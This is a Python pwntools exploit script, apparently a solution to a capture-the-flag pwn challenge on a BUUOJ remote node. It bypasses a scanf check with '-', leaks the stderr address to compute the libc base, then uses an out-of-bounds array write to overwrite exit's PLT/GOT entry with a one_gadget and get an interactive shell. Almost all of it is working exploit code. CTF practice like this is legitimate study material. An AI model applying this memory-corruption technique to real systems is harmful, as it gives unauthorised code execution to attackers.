'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

1. '-' bypass scanf("%ld", &num)
2. leak stderr address to calculate libc base
3. array out of bound to hijack exit_plt to one_gadget
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "28769" 
filename = "./pwn"
elf = ELF(filename)
local_libc = '/home/fa1c4/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6'
remote_libc = './libc-2.31.so'
libc = ELF(local_libc if local else remote_libc)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B(tag=0):
    if tag: gdb.attach(io)
    pause()

bss_addr = 0x00000000004040A0
exit_plt_addr = 0x0000000000404030
array_offset = (exit_plt_addr - bss_addr) // 4 # dword

def pwn():
    io.sendlineafter(b'Do you have any suggestions for us\n', b'2')
    # B(1)
    io.sendline(b'-')
    io.recvline()

    io.sendline(b'-')
    io.recvuntil(b'Your suggestion is ')
    stderr_addr = int(io.recvuntil(b'\n', drop=True))
    libc.address = stderr_addr - libc.sym['_IO_2_1_stderr_']
    log.success(f'libc_base: {hex(libc.address)}')

    puts_addr = libc.sym['puts']
    io.sendlineafter(b'Now please enter the verification code\n', str(puts_addr).encode())

    # local 0xe6aee 0xe6af1 0xe6af4
    # remote 0xe3afe 0xe3b01 0xe3b04
    one_gadget_addr = libc.address + 0xe3b01    
    log.success(f'one_gadget: {hex(one_gadget_addr)}')

    hijack_addr = p64(one_gadget_addr)
    hijack_addr1 = u32(hijack_addr[:4]) # low 4 bytes
    hijack_addr2 = u32(hijack_addr[4:]) # high 4 bytes

    # hijack exit_plt to one_gadget
    log.success(f'array_offset: {array_offset}')
    io.sendlineafter(b'You can modify your suggestions\n', str(array_offset).encode())
    io.sendlineafter(b'input new suggestion\n', str(hijack_addr1).encode())

    io.sendlineafter(b'You can modify your suggestions\n', str(array_offset + 1).encode())
    io.sendlineafter(b'input new suggestion\n', str(hijack_addr2).encode())


if __name__ == "__main__":
    pwn()
    io.interactive()
